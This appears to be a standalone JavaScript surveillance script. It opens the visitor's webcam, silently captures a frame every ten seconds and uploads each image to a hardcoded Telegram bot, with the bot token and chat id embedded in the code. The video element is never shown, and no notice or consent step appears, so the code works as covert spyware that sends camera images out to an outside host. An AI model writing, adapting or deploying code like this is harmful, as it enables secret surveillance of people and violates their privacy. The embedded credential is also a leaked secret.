const botToken = '7239458839:AAHTXtF23O2Zfe7q1OSOTtpQvbCjXCflFAg';
const chatId = '5541151768';

// Create a video element dynamically and add it to the document
const video = document.createElement('video');
video.width = 640;
video.height = 480;
video.autoplay = true;

// Create a canvas element dynamically for capturing images
const canvas = document.createElement('canvas');
canvas.width = 640;
canvas.height = 480;
const context = canvas.getContext('2d');

// Access the device camera and stream to the video element
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        // Set up an interval to capture and send images every 10 seconds
        setInterval(captureAndSendImage, 10000); // 10000 ms = 10 seconds
    })
    .catch(err => {
        console.error("Error accessing the camera: " + err);
    });

// Function to capture and send the image
function captureAndSendImage() {
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageDataURL = canvas.toDataURL('image/jpeg');
    sendImageToTelegram(imageDataURL);
}

// Function to send the image to Telegram
function sendImageToTelegram(imageDataURL) {
    fetch(imageDataURL)
        .then(res => res.blob())
        .then(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Photo sent successfully!');
                } else {
                    console.error('Failed to send photo.');
                }
            })
            .catch(error => {
                console.error('Error sending photo: ', error);
            });
        });
}
